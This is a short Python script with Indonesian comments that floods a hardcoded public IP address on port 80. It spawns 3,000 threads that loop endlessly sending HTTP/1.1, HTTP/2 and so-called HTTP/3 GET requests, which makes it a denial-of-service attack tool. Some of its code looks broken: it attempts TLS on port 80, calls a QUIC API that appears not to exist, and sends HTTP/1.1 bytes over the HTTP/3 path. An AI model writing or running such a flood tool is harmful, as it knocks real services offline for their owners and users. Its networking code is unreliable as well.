import socket
import ssl
import threading
import time
import h2.connection
import h2.events
import h3

# Konfigurasi target
target_ip = "138.201.139.144"
target_port = 80

# Fungsi untuk mengirim request HTTP/1.1
def send_request_http1():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n", (target_ip, target_port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")

# Fungsi untuk mengirim request HTTP/2
def send_request_http2():
    while True:
        try:
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2'])
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            ssl_socket = context.wrap_socket(s, server_hostname=target_ip)
            conn = h2.connection.H2Connection()
            conn.initiate_connection()
            ssl_socket.sendall(conn.data_to_send())
            while True:
                data = ssl_socket.recv(1024)
                if not data:
                    break
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.ResponseReceived):
                        print(f"HTTP/2 Response: {event.headers}")
            ssl_socket.close()
        except Exception as e:
            print(f"Error: {e}")

# Fungsi untuk mengirim request HTTP/3
def send_request_http3():
    while True:
        try:
            quic = h3.Quic()
            quic.connect((target_ip, target_port))
            stream_id = quic.create_stream()
            quic.send_request(stream_id, b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n")
            while True:
                data = quic.recv()
                if not data:
                    break
                print(f"HTTP/3 Response: {data}")
            quic.close()
        except Exception as e:
            print(f"Error: {e}")

# Buat thread untuk mengirim request
threads = []
for i in range(1000):
    t1 = threading.Thread(target=send_request_http1)
    t2 = threading.Thread(target=send_request_http2)
    t3 = threading.Thread(target=send_request_http3)
    threads.append(t1)
    threads.append(t2)
    threads.append(t3)
    t1.start()
    t2.start()
    t3.start()

# Tunggu semua thread selesai
for t in threads:
    t.join()
